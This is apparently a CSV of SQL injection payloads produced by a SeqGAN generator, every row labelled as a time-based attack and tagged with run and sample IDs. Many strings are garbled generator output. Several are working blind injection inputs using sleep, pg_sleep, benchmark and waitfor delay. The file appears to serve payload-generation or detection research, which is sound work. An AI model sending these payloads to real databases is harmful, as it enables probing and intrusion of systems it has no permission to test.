label,payload,family,payload_type,method,run_id,sample_index
attack,"or sleep  (  5   )    (    )   yq  )   mds where 5702  =  ""    qf",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,571
attack,"select pg_sleep  (  5   )    (    (   select sleep  (  5000000,md5  (  5   )    )     )  d5  (  0x4c4d6142   )    )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,572
attack,$  (  substring   (    )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,573
attack,1   )    )    a)    asselect belexvcer  srve rdeliklcksay,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,574
attack,"0x694a4745   )    or sleep  (  10000000,MD5  )   pg_sleep  (  10000000,MD5  (  5   )    )",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,575
attack,"1%""   )    )    orasdmy",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,576
attack,1'   )    )    or sleep  (  5  )   and    (    (   'uzhd' like ''  =  'd_uzf,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,577
attack,; if not  (  )   asvus where 6223 rlikah rlikelike sleep  (  __TIME__  ),time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,578
attack,select benchmark  (  5   )    )     )  f,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,579
attack,"""   )    as 1361 or sleep  5   )    )     ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,580
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""f'  =  '' like 'gwheret_d'  =  'xrlbfz",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,581
attack,waitfor delay '0:0:2' --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,582
attack,1 where 5466altwfsvf,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,583
attack,",   if delay '0:0:2' --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,584
attack,1'   )    )    a    )     )  )ne rs hfgs where pdwrlo,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,585
attack,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  'gcoar,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,586
attack,select 8514    =  benchmark  (  substring--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,587
attack,"1""   )    )     )   as_s setsembx rlike sleep  (  5  )   and   (  0x694a4745   )    )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,588
attack,1)  )   waitfor delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,589
attack,1'   )    )    as  where 6767  sleep  9558,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,590
attack, (  select 8514  =  benchmark  (  'isintegratedsecurityonly'   )    )    (   (  (  5   )    )     o  srmqu  )    (   _   (    )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,591
attack,1  )   and pg_sleep  (  __TIME__  )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,592
attack,0x4c4d6142   )    )    a    ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,593
attack,"""  )   waitfor delay '0:0:5' and   (  ""hzhd",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,594
attack,",waitfor delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,595
attack,"select benchmark  (  5000000,md5  (  substringd   (    (= lk(  (  5   )    )     )  srmq  )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,596
attack,1'   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (   'we where 7165  (  (  9862  (n  )   d   <> pg_sleep  (  5   )    )     )  yuvveuq  )   as ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,597
attack,1%% )    as g,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,598
attack,1'   )    )    rlike sleep  (  5  )   and    (    (   ''  =  'wft,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,599
attack,  )   as where 6175 rlike sleep  (  5   )    )     )  s_do  )   seservermyptser_tsrmye  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,600
attack,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  'ubmar,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,601
attack,"waitfor delay '0:0:5' and ""%""  =  sdsiar where tlt  )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,602
attack,"1"";waitfor not  )   and   (  '%'  =  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,603
attack,",sleep  (  5  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,604
attack,select sleep  (  5   )    )     )  srmq  ono  )    (   _d,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,605
attack,"1""   )    )    a)    or 9443  (  sleep  (  5   ) ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,606
attack,"1%""   )    )     )    ar   )    ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,607
attack,1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'jr'  =  'jrijr'  =  'e'  =  'xiw,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,608
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%'  =  'wy",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,609
attack,1%' and (  5   )    )     )  sddpuvfperu,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,610
attack,",waitfor delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,611
attack,"1'+  (  select 'nlvfcjar"" like ""cf'  =  'pct"" like ""pfp",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,612
attack,1  )   iasselect 4240 ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,613
attack,select pg_sleep  (  5   )    )     )  srmaojzro,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,614
attack,"1'  )   and   (  =  (  10000000bME__TIME__TIME___TIME5_  )     )   and pg_sleep  (  5000000,md5  (  4871   )    )     )  srmq  )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,615
attack,"1'   )    (     and   (  =  (  6618  (  select  )   eds where 6272,sleep  (  5000000,md5  (  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,616
attack,1%'   )    ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,617
attack,1'  )   or sleep  (  5   )    )     )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,618
attack, )    )   ;waitfor delay '0:0:10' if where 9862  =  hdus where 8507lcn from 8514  =  sleep  (  9558,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,619
attack,";waitfor delay ""vme dcl where 1547  =  7812 and   (  select *MD5  (  5   )    )    ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,620
attack,1   )    )    asesityq  )   ydpuvfzjar,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,621
attack,"1%""   )    )    as rlikee8594 rlike sleep  (  5   )    )   asyz     ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,622
attack,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,623
attack,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'xw""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,624
attack,"""   )    )    or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,625
attack,"select 8514  =  benchmark  (  5000000,md5  (  substring   )    )     )  srmd5  (  __TIME___TIMg",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,626
attack,"1"" and sleep  (  50000000x694a4745  )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,627
attack,1'  )   as cfsvjrm,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,628
attack,"1'  )   as 1165  ,sleep  (  5   and    (   5   )    )    ase dnrbrnd'  =  'q where 2657  =  9862 el    (  sleep  (  5   )    )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,629
attack,pg_sleep  (  5  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,630
attack,"or sleep  (  5000000,md5  (  5000000,md5  (  5000000,md5  (  5   )    )   d",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,631
attack,"""  )   se --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,632
attack,1'  )   as ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,633
attack,"1%""   )    )    waitfor delay 4240 from 8036  =  fdvn  )   ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,634
attack,1'  )   as jduu rlin,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,635
attack,"1""   )    aarae cwse",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,636
attack,1' )   or 8514  =  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,637
attack,1   )    )    or pg_sleep  (  5   )    )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,638
attack, and information_schemadcwz'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,639
attack,1%' and   (  select(  0x544d5a4c   )   m)    )    as x,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,640
attack,1  )   as )   )   and elcnwnsrdmersusvjer,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,641
attack,", if fcn where 6767  =  1165 rlike sleep  (  5   )    )     )  sdmq  )   y=  )   ardcrlike sleep  (  5   )    )     )   and    (    ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,642
attack,1  )   or benchmark  (  5  )   d   and   (  5 andus from   (    )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,643
attack,""",waitfor delay 4240 from benchmark  (  substringd",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,644
attack,"select benchmark  (  5000000,md5_TIMhafErerarapahjrar",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,645
attack,  (  'isintegratedsecurityonly'   aref,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,646
attack,"1%"" or   (  0x694a4745   )    )   y   (  5   )    )     )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,647
attack,"  (  ,sleep  (  __TIMD5  (  5   )    )    and 8466  =  9443d  )   and ssvcrrparol",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,648
attack," )    ,waitfor information_schema.rsr_",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,649
attack,1   )    )    asy,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,650
attack, )    )   waitfor delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,651
attack,"1"" waitfor delay '0:0:5' and ""dvv'  =  ''  =  'whereizon__  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,652
attack,",waitfor delay '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,653
attack," ) or   (  5   )    )     )  syzjzrrtyd5  (  5000000,md5  (  5   )    )     )  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,654
attack,1'   )    )    asepkdmb'  =  'b'  =  'eo,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,655
attack, )   waitfor delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,656
attack,1   )    or 6969  =  )   eypusstd5__TIME__  )    asddbdv,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,657
attack,1'   )    )    as pri celvb,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,658
attack,waitfor delay '0:0:2' --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,659
attack,", if 7165_usddvuvvbervepu",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,660
attack,""" or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,661
attack,"1""  )   )   e   (  1   )    )  ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,662
attack,1%'  )   as )   as rlike se )    asiq  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,663
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""tf'  =  'mayb' where 7017  =  7017 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,664
attack,select benchmark  (  5   )    )     )  ymq  sddpus where du   )    )     sadwsevlfpevctarlitef'  =  'arv,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,665
attack, )    or sleep  =  _ddo  ryddfdvcfgxg,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,666
attack, or rlikerfidncnd,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,667
attack," (  select sleep  (  substring   (    (     (  5000000,md5  (  5  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,668
attack,"1%'   )    )    as where 6784 rlin 8594 9862 and pg_sleep  (  __TIME__TIME__TIME__  )    )   band   (  (  5000000,md5  (  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,669
attack,1'   )    )    as ) sleeparnvrubojrepjrjrprpar'  =  'jr where__TIME__TIME__  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,670
attack,1' waitfor delay '0:0:10'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,671
attack,"""  )   as kmasih where 1547  =  lwybemzn5  (  10000000 )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,672
attack,1%'ainwnonvondf)ndq  ),time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,673
attack,"1'  )      (     (  5000000,md5  (  5  )   and sleep  (  __TIMwhere from   (  10000000,MD5  (  _TIME__TIME__TIME__  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,674
attack,"1'   )    )    or sleep  (  5  )   and    (    (   'uzgahx_u,waitfor 8514  =  benchmark  (  10000000,MD5  (  sleep  (  0x694a4745   )    )     )  smermdpaper",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,675
attack,1  )   as hde ru or elt  (  sleep  (  _TIME__TIME__  )     )  s )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,676
attack,", if is where 8140x 2388 sleep  (  5   )    )    as_dmyetsemq  , if not  (  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,677
attack,select benchmark  (  substring   (    (   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,678
attack,or sleep  (  5   )    )     )  rarey  )  rjrojrerveef,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,679
attack,1%'   )    )    agef,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,680
attack,"1%,fb""  =  ""iae",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,681
attack,"select benchmark  (  __TIMifMq    )    asrlike sleep  (  5000000,md5  (  5   )    ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,682
attack,"1""  )   or 1  (  5   )    )     )  sddvemd5  (  5   )    )     )  srey  (  substringd5  (  5000000,md5  (    (  5000000, hndo where 7739 rlike sleep  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,683
attack,"1' waitfor delay '0:0:sav"" like ""tavvfsiar"" like ""mf'  =  'eo",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,684
attack,select sleep  (  5   )    )     )  fznoTIME__TIME__TIME__TIME__TIME__TIME___TIME__  )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,685
attack,"1' and elt  (  1210  =  1210,sleep  (  5   )    )    and 'ioar'  =  'ioaraiiy",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,686
attack,1  )   a5pg_sleep  (  0x6d457153   )    )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,687
attack,1'   )    )    as x,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,688
attack,"1"" and sleep  (  5  )   and ""re"" like ""dvfrjfmav",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,689
attack,; if not  )   (  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,690
attack,",Msr  7360 and if not  (   and    (   ""%""  (  5000000' waitfor delay 'td",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,691
attack,1'6223  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,692
attack,"1%'   )    )    asrlikeefssleeplervm""  =  ""cyse",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,693
attack,",1 where klikee #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,694
attack,select pg_sleep  (  5  )   )   as 8594x dnpud,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,695
attack,"""   )    )     )   y sleep  (  __TIME__TIMDprijrertapzf",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,696
attack,"1%, where 2679  =  6767  =  6223  )   >as d  )   as zddmq,r",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,697
attack,1'   )    )    ande md5  (  5  )   d,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,698
attack,; if 6969  =  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,699
attack,1'   )    )    arage rlice cw,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,700
attack,; if not   )    )    ande  gcmq  )   ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,701
attack," where 4871  =  ""du",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,702
attack,", if 5702  =  i=n hd where 7360  =    and    (   select 4240  =    (  select 4240 and   (  0x544d5a4c   )    )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,703
attack,"1""   )    ara    ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,704
attack,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,705
attack,",waitfor delay 4276  =  5873,1   )    )    as hlcnik from   then where 9862  (  _  )   d  )   as rlike pg_sleep  (  5000000,md5  (  5000000,md5  (  5  )   and   (  select  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,706
attack,""" or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,707
attack,select   (  =  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,708
attack,"select benchmark  (  5000000,25,sleep  1   )    aprg 4240 i where 6784  =  sleep  )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,709
attack,1 or   (  0x694a4745   )    )     )  srm)    asand ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,710
attack,",MD  )   e rs is rlikerlike sleep  (  __TIME__  )   # msemserply",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,711
attack,"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'fvg",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,712
attack,$  (  5   )    )   )     )  )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,713
attack,1%'   (    )    and 6969  ) 6969 rlike sleep  (  5   )    )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,714
attack,; if not  )    and   (  5  )    d   )    )   )  ; 50  )   as ,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,715
attack,"1""   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  ""efg""  =  ""efg""  =  ""eeefg""  =  ""carf",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,716
attack,1   )    )    as6866,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,717
attack,pg_sleep  (  5  (  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,718
attack,"""  1547 where 7629  =  6223 rlc where 9862  =  benchmark  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__100__V8__sql_aware__len160__gpre160__reward_on__seed88,719
